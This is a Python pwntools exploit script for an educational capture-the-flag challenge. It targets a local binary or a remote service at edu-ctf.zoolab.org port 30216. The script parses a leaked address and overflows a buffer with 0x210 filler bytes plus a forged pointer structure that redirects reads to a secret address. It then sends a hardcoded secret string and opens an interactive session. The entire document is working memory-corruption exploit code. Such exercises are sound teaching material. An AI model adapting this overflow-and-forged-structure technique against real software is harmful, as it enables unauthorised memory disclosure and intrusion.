#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

if args['R']:
    r = remote('edu-ctf.zoolab.org', 30216)
else:
    r = process('./chal')


r.recvuntil('0x')

note_buf = int(r.recvline(), 16)
debug_secret = note_buf - 0x30

print(hex(note_buf))
print(hex(debug_secret))

r.sendlineafter('>', b'1')
r.sendlineafter('>', b'2')

flags = 0
payload = flat(
    flags, 0,
    0, 0,
    0, 0, 
    0, debug_secret, 
    debug_secret + 0x10, 0, 
    0, 0,
    0, 0,
    0
)
r.sendlineafter('data>', b'A'*0x210 + payload)
# gdb.attach(r)
r.sendlineafter('>', b'4')
r.sendline('gura_50_cu73\x00')


r.interactive()